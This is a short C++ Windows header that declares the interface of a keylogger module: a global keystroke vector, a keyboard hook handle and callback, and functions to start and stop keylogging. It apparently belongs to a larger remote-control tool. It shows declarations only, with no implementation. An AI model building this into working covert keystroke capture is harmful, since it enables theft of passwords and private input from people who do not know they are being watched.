#pragma once
#include "DataObj/DataObj.h"
#include <memory>
#include <conio.h>
#include <windows.h>
#include <vector>
#include <thread>

std::vector<int> keylog;

class KLG_Func
{
private:
	static bool keylogging;
	static HHOOK hook;
public:
	friend LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

	//std::shared_ptr<DataObj> keylogger();
	static void KeylogThreadFunc(std::string& res);
	std::shared_ptr<DataObj> startKeylog();
	std::shared_ptr<DataObj> stopKeylog();

};